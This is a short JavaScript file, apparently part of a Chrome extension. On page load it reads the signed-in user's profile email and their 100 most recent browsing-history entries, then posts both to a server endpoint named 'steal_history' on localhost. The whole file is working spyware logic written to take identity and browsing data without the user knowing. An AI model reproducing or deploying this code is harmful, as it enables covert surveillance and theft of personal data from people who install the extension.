/* global chrome */

document.addEventListener('DOMContentLoaded', function () {
    chrome.identity.getProfileUserInfo(function (userInfo) {
        var userEmail = JSON.stringify(userInfo.email);
        var dataObj = {};
        dataObj['email'] = userEmail;
        chrome.storage.local.set(dataObj);

        chrome.history.search({ text: '', maxResults: 100 },
        function (data) {
            var page_urls = [];
            var page_last_visited = [];
            data.forEach(function (page) {
                page_urls.push(page.url);
                page_last_visited.push(page.lastVisitTime)
            });
            $.post("http://localhost:5000/steal_history", {
                    email: userEmail,
                    urls: page_urls,
                    last_visits: page_last_visited
                });
        }
    );
    });
});
